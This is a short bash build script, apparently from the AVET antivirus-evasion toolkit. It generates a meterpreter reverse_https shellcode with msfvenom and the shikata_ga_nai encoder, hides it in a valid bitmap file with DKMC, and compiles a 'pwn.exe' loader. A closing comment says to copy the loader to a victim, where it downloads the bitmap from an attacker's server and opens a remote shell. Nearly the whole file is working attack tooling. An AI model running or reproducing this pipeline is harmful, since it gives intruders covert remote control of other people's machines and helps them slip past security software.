#!/bin/bash          
# example script for building executables and DKMC payload
# which is nice, this is hiding the shellcode in a valid bitmap file
# DKMC has to be in a directory side by side to avet eg. ~/tools/avet ~/tools/DKMC for running this script
# for more look here https://govolution.wordpress.com/2018/03/02/download-exec-poc-and-dkmc/
# please note that the bmp file will be written to /var/www/html/sc.bmp
. build/global_win32.sh
# make meterpreter reverse payload, format correct for DKMC and run DKMC for making the bitmap file
msfvenom -p windows/meterpreter/reverse_https lhost=127.0.0.1 lport=443 -e x86/shikata_ga_nai -f c -a x86 --platform Windows | sed 's/\\/\\\\/g' > sc.txt
x=`./sh_format sc.txt | tr -d "\n" | tr -d ";" | tr -d "\""`
cd ../DKMC
printf "gen\nset output /var/www/html/sc.bmp\nset shellcode $x\nrun\nexit\nexit\n" | python dkmc.py
cd ../avet
# call make_avet, compile 
./make_avet -d sock
$win32_compiler -s -o pwn.exe avet.c  -lwsock32 -lWs2_32
# cleanup
echo "" > defs.h
# now copy pwn.exe to victim and exec like: pwn http://yourserver/sc.bmp
